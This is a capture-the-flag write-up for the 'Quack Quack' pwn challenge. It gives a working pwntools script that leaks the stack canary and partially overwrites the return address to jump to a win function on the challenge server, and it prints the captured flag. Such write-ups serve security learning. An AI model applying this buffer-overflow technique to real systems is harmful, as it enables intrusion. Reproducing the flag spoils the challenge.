https://ctftime.org/event/2674

# Quack Quack (pwn)

On the quest to reclaim the Dragon's Heart, the wicked Lord Malakar has cursed the villagers, turning them into ducks! Join Sir Alaric in finding a way to defeat them without causing harm. Quack Quack, it's time to face the Duck!

## Solution

1) Leak the canary
2) ret2win ~ using the 2 controlled bytes of the return address

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./quack_quack_patched", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="b duckling")
p = remote("94.237.55.91", 33274)

payload = b""
payload += b"Quack Quack "
payload = payload.rjust(0x65, b"Q")

p.sendlineafter(b"Quack the Duck!\n\n> ", payload)

p.readuntil(b"Quack Quack ")

canary = u64(b"\x00" + p.read(7))

payload = b""
payload += b"Q" * 0x58
payload += p64(canary) + p64(0)
payload += p16(elf.sym["duck_attack"] & 0xffff)

p.sendline(payload)

p.readuntil(b"HTB{")
print("HTB{" + p.readuntil(b"}").decode()) # HTB{~c4n4ry_g035_qu4ck_qu4ck~_d013ad2c60990274d4b4e73c5d6713a2}
```

## Flag
`HTB{~c4n4ry_g035_qu4ck_qu4ck~_d013ad2c60990274d4b4e73c5d6713a2}`

smiley 2025/03/23
